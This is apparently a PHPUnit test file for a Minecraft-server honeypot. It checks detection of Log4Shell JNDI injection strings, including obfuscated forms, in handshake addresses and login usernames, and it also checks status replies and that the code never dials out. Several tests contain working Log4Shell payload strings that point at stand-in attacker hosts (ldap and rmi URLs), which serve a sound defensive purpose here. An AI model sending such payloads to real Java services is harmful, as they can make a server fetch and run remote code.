<?php

declare(strict_types=1);

namespace Funnypot\Tests\Protocol\Minecraft;

use Funnypot\Protocol\Minecraft\MinecraftConfig;
use Funnypot\Protocol\Minecraft\MinecraftSession;
use Funnypot\Protocol\Minecraft\MinecraftThreat;
use Funnypot\Protocol\Minecraft\VarInt;
use PHPUnit\Framework\TestCase;

/** FP-0206 Phase 2+3: Log4Shell JNDI capture (incl. obfuscation), status/ping, and inertness. */
final class Log4ShellTrapTest extends TestCase
{
    private function config(): MinecraftConfig
    {
        return new MinecraftConfig(versionName: 'Paper 1.20.4', protocol: 765, motd: 'Private', maxPlayers: 40, onlinePlayers: 5);
    }

    // --- MinecraftThreat (pure) ---

    public function test_plain_jndi_is_caught_and_c2_extracted(): void
    {
        $v = MinecraftThreat::classify(['${jndi:ldap://attacker.example:1389/Exploit}']);
        self::assertSame(MinecraftThreat::CLASS_LOG4SHELL, $v['class']);
        self::assertTrue($v['critical']);
        self::assertSame('ldap://attacker.example:1389/Exploit', $v['c2']);
    }

    public function test_jndi_obfuscation_still_caught(): void
    {
        // ${${lower:j}ndi:...} — the literal "${jndi:" is absent; normalization reveals it.
        $v = MinecraftThreat::classify(['${${lower:j}ndi:ldap://c2.example/a}']);
        self::assertTrue($v['critical'], 'jndi-obfuscated payload caught');
    }

    public function test_scheme_obfuscation_still_fires_even_if_c2_messy(): void
    {
        // ${jndi:${lower:l}dap://c2/x} — gate fires on ${jndi:; C2 extraction is best-effort.
        $v = MinecraftThreat::classify(['${jndi:${lower:l}dap://c2.example/x}']);
        self::assertSame(MinecraftThreat::CLASS_LOG4SHELL, $v['class']);
        self::assertTrue($v['critical']);
        self::assertNotNull($v['raw'], 'raw payload always logged');
    }

    public function test_benign_is_ping(): void
    {
        $v = MinecraftThreat::classify(['mc.corp.local', 'player123']);
        self::assertSame(MinecraftThreat::CLASS_PING, $v['class']);
        self::assertFalse($v['critical']);
    }

    // --- MinecraftSession end-to-end (crafted wire) ---

    public function test_handshake_login_jndi_username_is_trapped(): void
    {
        $logged = [];
        $s = new MinecraftSession($this->config(), function (array $e) use (&$logged): void { $logged[] = $e; }, '203.0.113.5');

        // Handshake (next_state=2 login) with a benign address.
        $s->receive($this->handshake('mc.corp.local', 2));
        // Login Start with a JNDI username.
        $out = $s->receive($this->loginStart('${jndi:rmi://evil.example:1099/x}'));

        $hit = array_values(array_filter($logged, static fn ($e) => $e['event'] === MinecraftThreat::CLASS_LOG4SHELL));
        self::assertNotEmpty($hit, 'log4shell event emitted');
        self::assertSame('rmi://evil.example:1099/x', $hit[0]['c2']);
        self::assertNotSame('', $out, 'a kick disconnect is sent');
    }

    public function test_handshake_address_jndi_is_trapped(): void
    {
        $logged = [];
        $s = new MinecraftSession($this->config(), function (array $e) use (&$logged): void { $logged[] = $e; });
        $s->receive($this->handshake('${jndi:ldap://a.example/x}', 1));
        self::assertSame(MinecraftThreat::CLASS_LOG4SHELL, $logged[0]['event']);
    }

    public function test_status_request_returns_persona_json_and_ping_echoes(): void
    {
        $logged = [];
        $s = new MinecraftSession($this->config(), function (array $e) use (&$logged): void { $logged[] = $e; });
        $s->receive($this->handshake('mc.corp.local', 1));

        $statusOut = $s->receive($this->packet(0x00, '')); // Status Request
        $off = 0;
        $p = VarInt::readPacket($statusOut, $off);
        self::assertSame(0x00, $p['id']);
        $joff = 0;
        $json = VarInt::readString($p['payload'], $joff, 65535);
        $decoded = json_decode((string) $json, true);
        self::assertSame('Paper 1.20.4', $decoded['version']['name']);
        self::assertSame(40, $decoded['players']['max']);

        $pingOut = $s->receive($this->packet(0x01, 'ABCDEFGH')); // Ping w/ 8-byte long
        $off = 0;
        $pong = VarInt::readPacket($pingOut, $off);
        self::assertSame(0x01, $pong['id']);
        self::assertSame('ABCDEFGH', $pong['payload'], 'pong echoes the client long');
    }

    public function test_source_is_inert_no_outbound_dial(): void
    {
        $dir = \dirname(__DIR__, 3) . '/src/Protocol/Minecraft';
        $patterns = [
            '/\bfsockopen\s*\(/', '/\bpfsockopen\s*\(/', '/\bstream_socket_client\s*\(/', '/\bcurl_\w+\s*\(/',
            '/\bldap_[a-z]+\s*\(/', '/\bdns_get_record\s*\(/', '/\bcheckdnsrr\s*\(/', '/\bgetmxrr\s*\(/',
            '/\bgethostby\w+\s*\(/', '/\bget_headers\s*\(/',
        ];
        foreach (glob($dir . '/*.php') ?: [] as $file) {
            $src = (string) file_get_contents($file);
            foreach ($patterns as $p) {
                self::assertSame(0, preg_match($p, $src), "inertness: {$p} must not appear in " . basename($file));
            }
        }
    }

    // --- wire builders ---

    private function handshake(string $addr, int $next): string
    {
        $payload = VarInt::write(765)              // protocol
            . VarInt::writeString($addr)           // server address
            . "\x63\xDD"                           // port 25565 (u16 BE)
            . VarInt::write($next);                // next state

        return $this->packet(0x00, $payload);
    }

    private function loginStart(string $username): string
    {
        return $this->packet(0x00, VarInt::writeString($username));
    }

    private function packet(int $id, string $data): string
    {
        $body = VarInt::write($id) . $data;

        return VarInt::write(\strlen($body)) . $body;
    }
}
